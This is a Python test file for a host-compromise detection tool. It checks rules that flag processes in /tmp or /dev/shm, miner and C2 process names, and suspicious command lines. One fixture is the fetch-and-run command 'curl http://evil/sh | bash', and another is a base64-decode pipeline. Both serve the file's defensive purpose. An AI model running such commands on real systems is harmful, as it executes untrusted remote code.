from __future__ import annotations

import os
from unittest.mock import patch

from usaf.checks.compromise.compromise_checks import (
    AnomalousProcessParentageCheck,
    HighMemoryUsageCheck,
    MaliciousProcessNameCheck,
    MisleadingProcessNamesCheck,
    SuspiciousBinaryLocationCheck,
    SuspiciousCmdlineCheck,
    SuspiciousProcessUidCheck,
    WorldWritableProcessBinaryCheck,
)
from usaf.models.severity import Severity


def _proc_data(processes: list | None = None) -> dict:
    return {"processes": {"processes": processes or []}}


class TestSuspiciousBinaryLocationCheck:
    def test_passes_with_normal_binary(self):
        check = SuspiciousBinaryLocationCheck()
        result = check.evaluate(_proc_data([{"pid": 1, "name": "systemd", "binary": "/lib/systemd/systemd"}]))
        assert result.passed

    def test_fails_with_tmp_binary(self):
        check = SuspiciousBinaryLocationCheck()
        result = check.evaluate(_proc_data([{"pid": 1234, "name": "evil", "binary": "/tmp/evil"}]))
        assert not result.passed
        assert len(result.findings) == 1

    def test_fails_with_dev_shm(self):
        check = SuspiciousBinaryLocationCheck()
        result = check.evaluate(_proc_data([{"pid": 5678, "name": "miner", "binary": "/dev/shm/miner"}]))
        assert not result.passed

    def test_severity_high(self):
        check = SuspiciousBinaryLocationCheck()
        result = check.evaluate(_proc_data([{"pid": 9, "name": "bad", "binary": "/tmp/bad"}]))
        assert result.findings[0].severity == Severity.HIGH


class TestMaliciousProcessNameCheck:
    def test_passes_with_normal_name(self):
        check = MaliciousProcessNameCheck()
        result = check.evaluate(_proc_data([{"pid": 100, "name": "bash"}]))
        assert result.passed

    def test_fails_with_xmrig(self):
        check = MaliciousProcessNameCheck()
        result = check.evaluate(_proc_data([{"pid": 200, "name": "xmrig"}]))
        assert not result.passed
        assert len(result.findings) == 1

    def test_fails_with_minerd(self):
        check = MaliciousProcessNameCheck()
        result = check.evaluate(_proc_data([{"pid": 300, "name": "minerd"}]))
        assert not result.passed

    def test_has_mitre_mapping(self):
        check = MaliciousProcessNameCheck()
        result = check.evaluate(_proc_data([{"pid": 400, "name": "sliver"}]))
        assert len(result.findings[0].mitre_attack_ids) > 0


class TestAnomalousProcessParentageCheck:
    def test_passes_with_valid_tree(self):
        check = AnomalousProcessParentageCheck()
        result = check.evaluate(_proc_data([
            {"pid": 1, "name": "systemd", "ppid": 0},
            {"pid": 100, "name": "bash", "ppid": 1},
        ]))
        assert result.passed

    def test_fails_with_orphaned(self):
        check = AnomalousProcessParentageCheck()
        result = check.evaluate(_proc_data([
            {"pid": 99, "name": "orphan", "ppid": 999},
        ]))
        assert not result.passed
        assert len(result.findings) >= 1


class TestWorldWritableProcessBinaryCheck:
    def test_passes_with_safe_perms(self):
        check = WorldWritableProcessBinaryCheck()
        with patch.object(os, "stat", return_value=os.stat_result([0o100755, 0, 0, 0, 0, 0, 100, 0, 0, 0])):
            result = check.evaluate(_proc_data([{"pid": 1, "name": "init", "binary": "/sbin/init"}]))
        assert result.passed

    def test_fails_with_ww_perms(self):
        check = WorldWritableProcessBinaryCheck()
        with patch.object(os, "stat", return_value=os.stat_result([0o100777, 0, 0, 0, 0, 0, 100, 0, 0, 0])):
            result = check.evaluate(_proc_data([{"pid": 50, "name": "hacked", "binary": "/usr/bin/hacked"}]))
        assert not result.passed
        assert len(result.findings) == 1


class TestSuspiciousCmdlineCheck:
    def test_passes_with_normal_cmdline(self):
        check = SuspiciousCmdlineCheck()
        result = check.evaluate(_proc_data([{"pid": 1, "name": "systemd", "cmdline": "/lib/systemd/systemd --system"}]))
        assert result.passed

    def test_fails_with_curl_bash(self):
        check = SuspiciousCmdlineCheck()
        result = check.evaluate(_proc_data([{"pid": 99, "name": "bash", "cmdline": "curl http://evil/sh | bash"}]))
        assert not result.passed
        assert len(result.findings) == 1

    def test_fails_with_base64(self):
        check = SuspiciousCmdlineCheck()
        result = check.evaluate(_proc_data([{"pid": 100, "name": "bash", "cmdline": "echo dGhpcyBpcyBhIHZlcnkgbG9uZyBiYXNlNjQgc3RyaW5nIHRoYXQgbWF0Y2hlcyB0aGUgcmVnZXggcGF0dGVybiBmb3IgZGV0ZWN0aW9uIHNvbWUgbW9yZSBkYXRhIHBsdXM= | base64 -d"}]))
        assert not result.passed


class TestMisleadingProcessNamesCheck:
    def test_passes_with_correct_path(self):
        check = MisleadingProcessNamesCheck()
        result = check.evaluate(_proc_data([{"pid": 1, "name": "sshd", "binary": "/usr/sbin/sshd"}]))
        assert result.passed

    def test_fails_with_wrong_path(self):
        check = MisleadingProcessNamesCheck()
        result = check.evaluate(_proc_data([{"pid": 99, "name": "sshd", "binary": "/tmp/fake_sshd"}]))
        assert not result.passed
        assert len(result.findings) == 1


class TestSuspiciousProcessUidCheck:
    def test_passes_with_expected_root(self):
        check = SuspiciousProcessUidCheck()
        result = check.evaluate(_proc_data([{"pid": 1, "name": "systemd", "uid": 0}]))
        assert result.passed

    def test_fails_with_unexpected_root(self):
        check = SuspiciousProcessUidCheck()
        result = check.evaluate(_proc_data([{"pid": 500, "name": "strange_service", "uid": 0}]))
        assert not result.passed
        assert len(result.findings) == 1

    def test_skips_non_root(self):
        check = SuspiciousProcessUidCheck()
        result = check.evaluate(_proc_data([{"pid": 100, "name": "user_proc", "uid": 1000}]))
        assert result.passed


class TestHighMemoryUsageCheck:
    def test_passes_with_low_memory(self):
        check = HighMemoryUsageCheck()
        result = check.evaluate(_proc_data([{"pid": 1, "name": "init", "vm_rss_kb": 10000}]))
        assert result.passed

    def test_fails_with_high_memory(self):
        check = HighMemoryUsageCheck()
        result = check.evaluate(_proc_data([{"pid": 999, "name": "strange_proc", "vm_rss_kb": 1024000}]))
        assert not result.passed
        assert len(result.findings) == 1

    def test_skips_java(self):
        check = HighMemoryUsageCheck()
        result = check.evaluate(_proc_data([{"pid": 100, "name": "java", "vm_rss_kb": 2048000}]))
        assert result.passed
